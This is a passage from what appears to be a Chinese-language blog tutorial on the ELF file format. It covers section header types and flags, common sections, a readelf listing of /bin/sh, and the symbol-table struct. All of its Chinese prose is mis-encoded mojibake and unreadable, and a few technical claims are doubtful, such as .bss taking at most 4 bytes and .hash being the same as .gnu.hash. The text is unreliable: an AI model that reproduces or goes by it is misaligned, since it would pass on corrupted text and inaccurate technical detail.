‡æ–‡ä»¶åªèƒ½åŒ…å«ä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œä¸è¿‡æ­¤é™åˆ¶å°†æ¥å¯èƒ½ä¼šè§£é™¤</td></tr><tr><td>SHT_DYNAMIC</td><td>6</td><td>æ­¤èŠ‚åŒºåŒ…å«åŠ¨æ€é“¾æ¥çš„ä¿¡æ¯ã€‚ç›®å‰ä¸€ä¸ªç›®æ ‡æ–‡ä»¶ä¸­åªèƒ½åŒ…å«ä¸€ä¸ªåŠ¨æ€èŠ‚åŒºï¼Œå°†æ¥å¯èƒ½ä¼šå–æ¶ˆè¿™ä¸€é™åˆ¶</td></tr><tr><td>SHT_NOTE</td><td>7</td><td>æ­¤èŠ‚åŒºåŒ…å«ä»¥æŸç§æ–¹å¼æ¥æ ‡è®°æ–‡ä»¶çš„ä¿¡æ¯ï¼Œå³æç¤ºä¿¡æ¯</td></tr><tr><td>SHT_NOBITS</td><td>8</td><td>è¡¨ç¤ºè¯¥èŠ‚åœ¨æ–‡ä»¶ä¸­æ²¡æœ‰å†…å®¹ï¼Œå¦‚<code>.bss</code>èŠ‚ã€‚è¿™ç§ç±»å‹çš„èŠ‚åŒºä¸å ç”¨æ–‡ä»¶ä¸­çš„ç©ºé—´ï¼Œå…¶ä»–æ–¹é¢å’Œ<code>SHT_PROGBITS</code>ç›¸ä¼¼ã€‚å°½ç®¡æ­¤èŠ‚åŒºä¸åŒ…å«ä»»ä½•å­—èŠ‚ï¼Œæˆå‘˜<code>sh_offset</code>ä¸­è¿˜æ˜¯ä¼šåŒ…å«æ¦‚å¿µæ€§çš„æ–‡ä»¶åç§»</td></tr><tr><td>SHT_REL</td><td>9</td><td>æ­¤èŠ‚åŒºåŒ…å«é‡å®šä½è¡¨é¡¹ï¼Œå…¶ä¸­æ²¡æœ‰è¡¥é½ï¼ˆaddendsï¼‰ï¼Œä¾‹å¦‚32ä½ç›®æ ‡æ–‡ä»¶ä¸­çš„Elf32_relç±»å‹ã€‚ç›®æ ‡æ–‡ä»¶ä¸­å¯ä»¥æ‹¥æœ‰å¤šä¸ªé‡å®šä½èŠ‚åŒº</td></tr><tr><td>SHT_SHLIB</td><td>10</td><td>æ­¤èŠ‚åŒºè¢«ä¿ç•™ï¼Œä¸è¿‡å…¶è¯­ä¹‰æ˜¯æœªè§„å®šçš„ã€‚åŒ…å«æ­¤ç±»å‹èŠ‚åŒºçš„ç¨‹åºä¸ABIä¸å…¼å®¹</td></tr><tr><td>SHT_DYNSYM</td><td>11</td><td><strong>åŠ¨æ€é“¾æ¥çš„ç¬¦å·è¡¨</strong>ã€‚ä½œä¸ºä¸€ä¸ªå®Œæ•´çš„ç¬¦å·è¡¨ï¼Œå®ƒå¯èƒ½åŒ…å«å¾ˆå¤šå¯¹åŠ¨æ€é“¾æ¥è€Œè¨€ä¸å¿…è¦çš„ç¬¦å·ã€‚å› æ­¤ï¼Œç›®æ ‡æ–‡ä»¶ä¹Ÿå¯ä»¥åŒ…å«ä¸€ä¸ªSHT_DYNSYMèŠ‚åŒºï¼Œå…¶ä¸­ä¿å­˜åŠ¨æ€é“¾æ¥ç¬¦å·çš„ä¸€ä¸ªæœ€å°é›†åˆï¼Œä»¥èŠ‚çœç©ºé—´</td></tr><tr><td>SHT_LOPROC</td><td>0x70000000</td><td>è¿™ä¸€æ®µï¼ˆåŒ…å«ä¸¤ä¸ªè¾¹ç•Œï¼‰ï¼Œæ˜¯ä¿ç•™ç»™å¤„ç†å™¨ä¸“ç”¨è¯­ä¹‰çš„</td></tr><tr><td>SHT_HIPROC</td><td>0x7FFFFFFF</td><td>è¿™ä¸€æ®µï¼ˆåŒ…å«ä¸¤ä¸ªè¾¹ç•Œï¼‰ï¼Œæ˜¯ä¿ç•™ç»™å¤„ç†å™¨ä¸“ç”¨è¯­ä¹‰çš„</td></tr><tr><td>SHT_LOUSER</td><td>0x80000000</td><td>æ­¤å€¼ç»™å‡ºä¿ç•™ç»™åº”ç”¨ç¨‹åºçš„ç´¢å¼•ä¸‹ç•Œ</td></tr><tr><td>SHT_HIUSER</td><td>0x8FFFFFFF</td><td>æ­¤å€¼ç»™å‡ºä¿ç•™ç»™åº”ç”¨ç¨‹åºçš„ç´¢å¼•ä¸Šç•Œ</td></tr></tbody></table><hr><h5 id="sh-flags"><a href="#sh-flags" class="headerlink" title="sh_flags"></a>sh_flags</h5><p>sh_flagså­—æ®µå®šä¹‰äº†ä¸€ä¸ªèŠ‚åŒºä¸­åŒ…å«çš„å†…å®¹æ˜¯å¦å¯ä»¥ä¿®æ”¹ã€æ˜¯å¦å¯ä»¥æ‰§è¡Œç­‰æ¶ˆæ¯ã€‚å¦‚æœä¸€ä¸ªæ ‡å¿—ä½è¢«è®¾ç½®ï¼Œåˆ™è¯¥ä½å–å€¼ä¸º1ã€‚æœªå®šä¹‰çš„å„ä½éƒ½è®¾ç½®ä¸º0ã€‚</p><table><thead><tr><th>åç§°</th><th>å–å€¼</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>SHF_WRITE</td><td>0x1</td><td>è¡¨ç¤ºè¯¥èŠ‚åœ¨è¿›ç¨‹ç©ºé—´ä¸­å¯å†™</td></tr><tr><td>SHF_ALLOC</td><td>0x2</td><td>è¡¨ç¤ºè¯¥èŠ‚åœ¨è¿›ç¨‹ç©ºé—´ä¸­éœ€è¦åˆ†é…ç©ºé—´ã€‚æœ‰äº›åŒ…å«æŒ‡ç¤ºæˆ–æ§åˆ¶ä¿¡æ¯çš„èŠ‚ä¸éœ€è¦åœ¨è¿›ç¨‹ç©ºé—´ä¸­åˆ†é…ç©ºé—´ï¼Œå°±ä¸ä¼šæœ‰è¿™ä¸ªæ ‡å¿—ã€‚</td></tr><tr><td>SHF_EXECINSTR</td><td>0x4</td><td>è¡¨ç¤ºè¯¥èŠ‚åœ¨è¿›ç¨‹ç©ºé—´ä¸­å¯ä»¥è¢«æ‰§è¡Œ</td></tr><tr><td>SHF_MASKPROC</td><td>0xF0000000</td><td></td></tr></tbody></table><p>å…¶ä¸­å·²ç»å®šä¹‰äº†çš„å„ä½å«ä¹‰å¦‚ä¸‹ï¼š</p><ul><li>SHF_WRITEï¼šèŠ‚åŒºåŒ…å«è¿›ç¨‹æ‰§è¡Œè¿‡ç¨‹ä¸­å°†å¯å†™çš„æ•°æ®</li><li>SHF_ALLOCï¼šæ­¤èŠ‚åŒºåœ¨è¿›ç¨‹æ‰§è¡Œä¸­å ç”¨å†…å­˜ã€‚æŸäº›æ§åˆ¶èŠ‚åŒºå¹¶ä¸å‡ºç°äºç›®æ ‡æ–‡ä»¶çš„å†…å­˜æ˜ åƒä¸­ï¼Œå¯¹äºé‚£äº›èŠ‚åŒºï¼Œæ­¤ä½åº”è®¾ç½®ä¸º0</li><li>SHF_EXECINSTRï¼šèŠ‚åŒºåŒ…å«å¯æ‰§è¡Œçš„æœºå™¨æŒ‡ä»¤</li><li>SHF_MASKPROCï¼šæ‰€æœ‰åŒ…å«äºæ­¤æ©ç ä¸­çš„å››ä½éƒ½ç”¨äºå¤„ç†å™¨ä¸“ç”¨çš„è¯­ä¹‰</li></ul><hr><h5 id="sh-linkå’Œsh-info"><a href="#sh-linkå’Œsh-info" class="headerlink" title="sh_linkå’Œsh_info"></a>sh_linkå’Œsh_info</h5><p>å¦‚æœèŠ‚çš„ç±»å‹æ˜¯ä¸é“¾æ¥æœ‰å…³çš„ï¼ˆæ— è®ºæ˜¯åŠ¨æ€é“¾æ¥è¿˜æ˜¯é™æ€é“¾æ¥ï¼‰ï¼Œå¦‚<strong>é‡å®šä½è¡¨ã€ç¬¦å·è¡¨</strong>ç­‰ï¼Œåˆ™<code>sh_link</code>ã€<code>sh_info</code>ä¸¤ä¸ªæˆå‘˜æ‰€åŒ…å«çš„æ„ä¹‰å¦‚ä¸‹æ‰€ç¤ºã€‚å…¶å®ƒç±»å‹çš„èŠ‚ä¸­è¿™ä¸¤ä¸ªæˆå‘˜æ²¡æœ‰æ„ä¹‰ã€‚</p><p>æ ¹æ®èŠ‚åŒºç±»å‹çš„ä¸åŒï¼Œsh_linkå’Œsh_infoçš„å…·ä½“å«ä¹‰ä¹Ÿæœ‰æ‰€ä¸åŒï¼š</p><p><img src="http://cdn.peckerwood.top/3-4-1.png" alt="png"></p><hr><h3 id="ELF-Sections"><a href="#ELF-Sections" class="headerlink" title="ELF Sections"></a>ELF Sections</h3><h4 id="èŠ‚çš„åˆ†ç±»"><a href="#èŠ‚çš„åˆ†ç±»" class="headerlink" title="èŠ‚çš„åˆ†ç±»"></a>èŠ‚çš„åˆ†ç±»</h4><p><strong>.text</strong></p><p><code>.text</code>èŠ‚æ˜¯ä¿å­˜äº†ç¨‹åºä»£ç æŒ‡ä»¤çš„ä»£ç èŠ‚ã€‚ä¸€æ®µå¯æ‰§è¡Œç¨‹åºï¼Œå¦‚æœå­˜åœ¨Phdrï¼Œåˆ™<code>.text</code>èŠ‚å°±ä¼šå­˜åœ¨äº<code>text</code>æ®µä¸­ã€‚ç”±äº<code>.text</code>èŠ‚ä¿å­˜äº†ç¨‹åºä»£ç ï¼Œæ‰€ä»¥èŠ‚ç±»å‹ä¸º<code>SHT_PROGBITS</code>ã€‚</p><p><strong>.rodata</strong></p><p><code>.rodata</code>èŠ‚ä¿å­˜äº†åªè¯»çš„æ•°æ®ï¼Œå¦‚ä¸€è¡Œcè¯­è¨€ä»£ç ä¸­çš„å­—ç¬¦ä¸²ã€‚ç”±äº<code>.rodata</code>èŠ‚æ˜¯åªè¯»çš„ï¼Œæ‰€ä»¥åªèƒ½å­˜åœ¨äºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„<strong>åªè¯»æ®µ</strong>ä¸­ã€‚å› æ­¤ï¼Œåªèƒ½åœ¨<code>text</code>æ®µï¼ˆè€Œä¸æ˜¯<code>data</code>æ®µï¼‰ä¸­æ‰¾åˆ°<code>.rodata</code>èŠ‚ã€‚ç”±äº<code>.rodata</code>èŠ‚æ˜¯åªè¯»çš„ï¼Œæ‰€ä»¥èŠ‚ç±»å‹ä¸º<code>SHT_PROGBITS</code>ã€‚</p><p><strong>.plt</strong></p><p><code>.plt</code>èŠ‚ä¹Ÿç§°ä¸º<strong>è¿‡ç¨‹é“¾æ¥è¡¨ï¼ˆProcedure Linkage Tableï¼‰</strong>ï¼Œå…¶åŒ…å«äº†åŠ¨æ€é“¾æ¥å™¨è°ƒç”¨ä»å…±äº«åº“å¯¼å…¥çš„å‡½æ•°æ‰€å¿…éœ€çš„ç›¸å…³ä»£ç ã€‚ç”±äº<code>.plt</code>èŠ‚ä¿å­˜äº†ä»£ç ï¼Œæ‰€ä»¥èŠ‚ç±»å‹ä¸º<code>SHT_PROGBITS</code>ã€‚</p><p><strong>.data</strong></p><p><code>.data</code>èŠ‚å­˜åœ¨äº<code>data</code>æ®µä¸­ï¼Œ<strong>å…¶ä¿å­˜äº†åˆå§‹åŒ–çš„å…¨å±€å˜é‡ç­‰æ•°æ®</strong>ã€‚ç”±äº<code>.data</code>èŠ‚ä¿å­˜äº†ç¨‹åºçš„å˜é‡æ•°æ®ï¼Œæ‰€ä»¥èŠ‚ç±»å‹ä¸º<code>SHT_PROGBITS</code>ã€‚</p><p><strong>.bss</strong></p><p><code>.bss</code>èŠ‚å­˜åœ¨äº<code>data</code>æ®µä¸­ï¼Œå ç”¨ç©ºé—´ä¸è¶…è¿‡4å­—èŠ‚ï¼Œä»…è¡¨ç¤ºè¿™ä¸ªèŠ‚æœ¬æ¥çš„ç©ºé—´ã€‚<code>.bss</code>èŠ‚ä¿å­˜äº†æœªè¿›è¡Œåˆå§‹åŒ–çš„å…¨å±€æ•°æ®ã€‚ç¨‹åºåŠ è½½æ—¶æ•°æ®è¢«åˆå§‹åŒ–ä¸º0ï¼Œåœ¨ç¨‹åºæ‰§è¡ŒæœŸé—´å¯ä»¥è¿›è¡Œèµ‹å€¼ã€‚ç”±äº<code>.bss</code>èŠ‚æœªä¿å­˜å®é™…çš„æ•°æ®ï¼Œæ‰€ä»¥èŠ‚ç±»å‹ä¸º<code>SHT_NOBITS</code>ã€‚</p><p><strong>.got.plt</strong></p><p><code>.got</code>èŠ‚ä¿å­˜äº†å…¨å±€åç§»é‡ã€‚<code>.got</code>èŠ‚å’Œ<code>.plt</code>èŠ‚ä¸€èµ·æä¾›äº†å¯¹å¯¼å…¥çš„å…±äº«åº“å‡½æ•°çš„è®¿é—®å…¥å£ï¼Œç”±åŠ¨æ€é“¾æ¥å™¨åœ¨è¿è¡Œæ—¶è¿›è¡Œä¿®æ”¹ã€‚ç”±äº<code>.got .plt</code>èŠ‚ä¸ç¨‹åºæ‰§è¡Œæœ‰å…³ï¼Œæ‰€ä»¥èŠ‚ç±»å‹ä¸º<code>SHT_PROGBITS</code>ã€‚</p><p><strong>.dynsym</strong></p><p><code>.dynsym</code>èŠ‚ä¿å­˜åœ¨<code>text</code>æ®µä¸­ã€‚å…¶ä¿å­˜äº†ä»å…±äº«åº“å¯¼å…¥çš„åŠ¨æ€ç¬¦å·è¡¨ã€‚èŠ‚ç±»å‹ä¸º<code>SHT_DYNSYM</code>ã€‚</p><p><strong>.dynstr</strong></p><p><code>.dynstr</code>ä¿å­˜äº†åŠ¨æ€é“¾æ¥å­—ç¬¦ä¸²è¡¨ï¼Œè¡¨ä¸­å­˜æ”¾äº†ä¸€ç³»åˆ—å­—ç¬¦ä¸²ï¼Œè¿™äº›å­—ç¬¦ä¸²ä»£è¡¨äº†ç¬¦å·åç§°ï¼Œä»¥ç©ºå­—ç¬¦ä½œä¸ºç»ˆæ­¢ç¬¦ã€‚</p><p><strong>.rel.name .relaname</strong></p><p>nameæ ¹æ®é‡å®šä½æ‰€é€‚ç”¨çš„èŠ‚åŒºç»™å®šã€‚ä¾‹å¦‚<code>.text</code>èŠ‚åŒºçš„é‡å®šä½èŠ‚åŒºåå­—å°†æ˜¯ï¼š<code>.rel.text</code>æˆ–è€…<code>.rela.text</code>ã€‚é‡å®šä½è¡¨ä¿å­˜äº†é‡å®šä½ç›¸å…³çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯æè¿°äº†å¦‚ä½•åœ¨é“¾æ¥æˆ–è¿è¡Œæ—¶ï¼Œå¯¹ELFç›®æ ‡æ–‡ä»¶çš„æŸäº›éƒ¨åˆ†æˆ–è€…è¿›ç¨‹é•œåƒè¿›è¡Œè¡¥å……æˆ–è€…ä¿®æ”¹ã€‚ç”±äºé‡å®šä½è¡¨ä¿å­˜äº†é‡å®šä½ç›¸å…³çš„æ•°æ®ï¼Œæ‰€ä»¥èŠ‚ç±»å‹ä¸º<code>SHT_REL</code>ã€‚</p><p><strong>.hash</strong></p><p><code>.hash</code>èŠ‚ä¹Ÿç§°ä¸º<code>.gnu.hash</code>ï¼Œå…¶ä¿å­˜äº†ä¸€ä¸ªç”¨äºæŸ¥æ‰¾ç¬¦å·çš„æ•£åˆ—è¡¨ã€‚</p><p><strong>.symtab</strong></p><p><code>.symtab</code>èŠ‚æ˜¯ä¸€ä¸ª<code>ElfN_Sym</code>çš„æ•°ç»„ï¼Œä¿å­˜äº†ç¬¦å·ä¿¡æ¯ã€‚èŠ‚ç±»å‹ä¸º<code>SHT_SYMTAB</code>ã€‚</p><p><strong>.strtab</strong></p><p><code>.strtab</code>èŠ‚ä¿å­˜çš„æ˜¯ç¬¦å·å­—ç¬¦ä¸²è¡¨ï¼Œè¡¨ä¸­çš„å†…å®¹ä¼šè¢«<code>.symtab</code>çš„<code>ElfN_Sym</code>ç»“æ„ä¸­çš„<code>st_name</code>å¼•ç”¨ã€‚èŠ‚ç±»å‹ä¸º<code>SHT_STRTAB</code>ã€‚</p><p><strong>.ctors&amp;.dtors</strong></p><p><code>ctors</code>ï¼ˆæ„é€ å™¨ï¼‰èŠ‚å’Œ<code>.dtors</code>ï¼ˆææ„å™¨ï¼‰èŠ‚åˆ†åˆ«ä¿å­˜äº†æŒ‡å‘æ„é€ å‡½æ•°å’Œææ„å‡½æ•°çš„å‡½æ•°æŒ‡é’ˆï¼Œæ„é€ å‡½æ•°æ˜¯åœ¨mainå‡½æ•°æ‰§è¡Œä¹‹å‰éœ€è¦æ‰§è¡Œçš„ä»£ç ï¼›ææ„å‡½æ•°æ˜¯åœ¨mainå‡½æ•°ä¹‹åéœ€è¦æ‰§è¡Œçš„ä»£ç ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨readelfå·¥å…·æ¥æŸ¥çœ‹èŠ‚å¤´è¡¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~$ readelf -S /bin/sh</span><br><span class="line">There are 30 section headers, starting at offset 0x1f398:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .interp           PROGBITS         0000000000000318  00000318</span><br><span class="line">       000000000000001c  0000000000000000   A       0     0     1</span><br><span class="line">  [ 2] .note.gnu.propert NOTE             0000000000000338  00000338</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     8</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE             0000000000000358  00000358</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 4] .note.ABI-tag     NOTE             000000000000037c  0000037c</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">  [ 5] .gnu.hash         GNU_HASH         00000000000003a0  000003a0</span><br><span class="line">       00000000000002d8  0000000000000000   A       6     0     8</span><br><span class="line">  [ 6] .dynsym           DYNSYM           0000000000000678  00000678</span><br><span class="line">       0000000000001158  0000000000000018   A       7     1     8</span><br><span class="line">  [ 7] .dynstr           STRTAB           00000000000017d0  000017d0</span><br><span class="line">       00000000000006b6  0000000000000000   A       0     0     1</span><br><span class="line">  [ 8] .gnu.version      VERSYM           0000000000001e86  00001e86</span><br><span class="line">       0000000000000172  0000000000000002   A       6     0     2</span><br><span class="line">  [ 9] .gnu.version_r    VERNEED          0000000000001ff8  00001ff8</span><br><span class="line">       0000000000000070  0000000000000000   A       7     1     8</span><br><span class="line">  [10] .rela.dyn         RELA             0000000000002068  00002068</span><br><span class="line">       0000000000001b00  0000000000000018   A       6     0     8</span><br><span class="line">  [11] .rela.plt         RELA             0000000000003b68  00003b68</span><br><span class="line">       00000000000007f8  0000000000000018  AI       6    25     8</span><br><span class="line">  [12] .init             PROGBITS         0000000000005000  00005000</span><br><span class="line">       000000000000001b  0000000000000000  AX       0     0     4</span><br><span class="line">  [13] .plt              PROGBITS         0000000000005020  00005020</span><br><span class="line">       0000000000000560  0000000000000010  AX       0     0     16</span><br><span class="line">  [14] .plt.got          PROGBITS         0000000000005580  00005580</span><br><span class="line">       0000000000000020  0000000000000010  AX       0     0     16</span><br><span class="line">  [15] .plt.sec          PROGBITS         00000000000055a0  000055a0</span><br><span class="line">       0000000000000550  0000000000000010  AX       0     0     16</span><br><span class="line">  [16] .text             PROGBITS         0000000000005af0  00005af0</span><br><span class="line">       0000000000011cf5  0000000000000000  AX       0     0     16</span><br><span class="line">  [17] .fini             PROGBITS         00000000000177e8  000177e8</span><br><span class="line">       000000000000000d  0000000000000000  AX       0     0     4</span><br><span class="line">  [18] .rodata           PROGBITS         0000000000018000  00018000</span><br><span class="line">       0000000000001f42  0000000000000000   A       0     0     32</span><br><span class="line">  [19] .eh_frame_hdr     PROGBITS         0000000000019f44  00019f44</span><br><span class="line">       0000000000000804  0000000000000000   A       0     0     4</span><br><span class="line">  [20] .eh_frame         PROGBITS         000000000001a748  0001a748</span><br><span class="line">       00000000000031a8  0000000000000000   A       0     0     8</span><br><span class="line">  [21] .init_array       INIT_ARRAY       000000000001ef30  0001df30</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .fini_array       FINI_ARRAY       000000000001ef38  0001df38</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [23] .data.rel.ro      PROGBITS         000000000001ef40  0001df40</span><br><span class="line">       0000000000000bc8  0000000000000000  WA       0     0     32</span><br><span class="line">  [24] .dynamic          DYNAMIC          000000000001fb08  0001eb08</span><br><span class="line">       00000000000001f0  0000000000000010  WA       7     0     8</span><br><span class="line">  [25] .got              PROGBITS         000000000001fcf8  0001ecf8</span><br><span class="line">       00000000000002f0  0000000000000008  WA       0     0     8</span><br><span class="line">  [26] .data             PROGBITS         0000000000020000  0001f000</span><br><span class="line">       0000000000000240  0000000000000000  WA       0     0     32</span><br><span class="line">  [27] .bss              NOBITS           0000000000020240  0001f240</span><br><span class="line">       0000000000002c30  0000000000000000  WA       0     0     32</span><br><span class="line">  [28] .gnu_debuglink    PROGBITS         0000000000000000  0001f240</span><br><span class="line">       0000000000000034  0000000000000000           0     0     4</span><br><span class="line">  [29] .shstrtab         STRTAB           0000000000000000  0001f274</span><br><span class="line">       000000000000011d  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  l (large), p (processor specific)</span><br></pre></td></tr></table></figure><h4 id="ç¬¦å·è¡¨"><a href="#ç¬¦å·è¡¨" class="headerlink" title="ç¬¦å·è¡¨"></a>ç¬¦å·è¡¨</h4><p>èŠ‚çš„åˆ†ç±»ä¸­æˆ‘ä»¬ä»‹ç»äº†<code>.dynsym</code>èŠ‚å’Œ<code>.symtab</code>èŠ‚ï¼Œä¸¤è€…éƒ½æ˜¯ç¬¦å·è¡¨ã€‚é‚£ä¹ˆå®ƒä»¬åˆ°åº•æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿå­˜åœ¨ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿ</p><p><strong>ç¬¦å·æ˜¯å¯¹æŸäº›ç±»å‹çš„æ•°æ®æˆ–ä»£ç ï¼ˆå¦‚å…¨å±€å˜é‡æˆ–å‡½æ•°ï¼‰çš„ç¬¦å·å¼•ç”¨ï¼Œå‡½æ•°åæˆ–å˜é‡åå°±æ˜¯ç¬¦å·å</strong>ã€‚ä¾‹å¦‚ï¼Œ<code>printf()</code>å‡½æ•°ä¼šåœ¨åŠ¨æ€é“¾æ¥ç¬¦å·è¡¨<code>.dynsym</code>ä¸­å­˜æœ‰ä¸€ä¸ªæŒ‡å‘è¯¥å‡½æ•°çš„ç¬¦å·é¡¹ï¼ˆä»¥<code>Elf_Sym</code>æ•°æ®ç»“æ„è¡¨ç¤ºï¼‰ã€‚åœ¨å¤§å¤šæ•°å…±äº«åº“å’ŒåŠ¨æ€é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œå­˜åœ¨ä¸¤ä¸ªç¬¦å·è¡¨ã€‚å³<code>.dynsym</code>å’Œ<code>.symtab</code>ã€‚</p><p><strong><code>.dynsym</code>ä¿å­˜äº†å¼•ç”¨æ¥è‡ªå¤–éƒ¨æ–‡ä»¶ç¬¦å·çš„å…¨å±€ç¬¦å·</strong>ã€‚å¦‚<code>printf</code>åº“å‡½æ•°ã€‚**<code>.dynsym</code>ä¿å­˜çš„ç¬¦å·æ˜¯<code>.symtab</code>æ‰€ä¿å­˜ç¬¦åˆçš„å­é›†ï¼Œ<code>.symtab</code>ä¸­è¿˜ä¿å­˜äº†å¯æ‰§è¡Œæ–‡ä»¶çš„æœ¬åœ°ç¬¦å·**ã€‚å¦‚å…¨å±€å˜é‡ï¼Œä»£ç ä¸­å®šä¹‰çš„æœ¬åœ°å‡½æ•°ç­‰ã€‚</p><p>æ—¢ç„¶<code>.dynsym</code>æ˜¯<code>.symtab</code>çš„å­é›†ï¼Œé‚£ä¸ºä½•è¦åŒæ—¶å­˜åœ¨ä¸¤ä¸ªç¬¦å·è¡¨å‘¢ï¼Ÿ</p><p>é€šè¿‡<code>readelf -S</code>å‘½ä»¤å¯ä»¥æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶çš„è¾“å‡ºï¼Œä¸€éƒ¨åˆ†èŠ‚æ ‡å¿—ä½ï¼ˆ<code>sh_flags</code>ï¼‰è¢«æ ‡è®°ä¸ºäº†<strong>Aï¼ˆALLOCï¼‰ã€WAï¼ˆWRITE/ALLOCï¼‰ã€AXï¼ˆALLOC/EXECï¼‰</strong>ã€‚å…¶ä¸­ï¼Œ<code>.dynsym</code>è¢«æ ‡è®°ä¸ºALLOCï¼Œè€Œ<code>.symtab</code>åˆ™æ²¡æœ‰æ ‡è®°ã€‚</p><p>ALLOCè¡¨ç¤ºæœ‰è¯¥æ ‡è®°çš„èŠ‚ä¼šåœ¨è¿è¡Œæ—¶åˆ†é…å¹¶è£…è½½è¿›å…¥å†…å­˜ï¼Œè€Œ<code>.symtab</code>ä¸æ˜¯åœ¨è¿è¡Œæ—¶å¿…éœ€çš„ï¼Œå› æ­¤ä¸ä¼šè¢«è£…è½½åˆ°å†…å­˜ä¸­ã€‚**<code>.dynsym</code>ä¿å­˜çš„ç¬¦å·åªèƒ½åœ¨è¿è¡Œæ—¶è¢«è§£æï¼Œå› æ­¤æ˜¯è¿è¡Œæ—¶åŠ¨æ€é“¾æ¥å™¨æ‰€éœ€çš„å”¯ä¸€ç¬¦å·**ã€‚<code>.dynsym</code>å¯¹äºåŠ¨æ€é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶çš„æ‰§è¡Œæ˜¯å¿…éœ€çš„ï¼Œè€Œ<code>.symtab</code>åªæ˜¯ç”¨æ¥è¿›è¡Œè°ƒè¯•å’Œé“¾æ¥çš„ã€‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/ELF/5.png" alt="img"></p><p>ä¸Šå›¾æ‰€ç¤ºä¸ºé€šè¿‡ç¬¦å·è¡¨ç´¢å¼•å­—ç¬¦ä¸²è¡¨çš„ç¤ºæ„å›¾ã€‚ç¬¦å·è¡¨ä¸­çš„æ¯ä¸€é¡¹éƒ½æ˜¯ä¸€ä¸ª<code>Elf_Sym</code>ç»“æ„ï¼Œå¯¹åº”å¯ä»¥åœ¨å­—ç¬¦ä¸²è¡¨ä¸­ç´¢å¼•å¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚è¯¥æ•°æ®ç»“æ„ç¬¦å·è¡¨é¡¹çš„æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word st_name;     <span class="comment">//ç¬¦å·åã€‚è¯¥å€¼ä¸ºè¯¥ç¬¦å·ååœ¨å­—ç¬¦ä¸²è¡¨ä¸­çš„åç§»åœ°å€ã€‚</span></span><br><span class="line">    Elf32_Addr st_value;    <span class="comment">//ç¬¦å·å¯¹åº”çš„å€¼ã€‚å­˜æ”¾ç¬¦å·çš„å€¼ï¼ˆå¯èƒ½æ˜¯åœ°å€æˆ–ä½ç½®åç§»é‡ï¼‰ã€‚</span></span><br><span class="line">    Elf32_Word st_size;     <span class="comment">//ç¬¦å·çš„å¤§å°ã€‚</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;  <span class="comment">//æ­¤æˆå‘˜ç»™å‡ºç¬¦å·çš„ç±»å‹å’Œç»‘å®šå±æ€§ã€‚ä¸‹é¢ç»™å‡ºè‹¥å¹²å–å€¼å’Œå«ä¹‰çš„ç»‘å®šå…³ç³»</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span 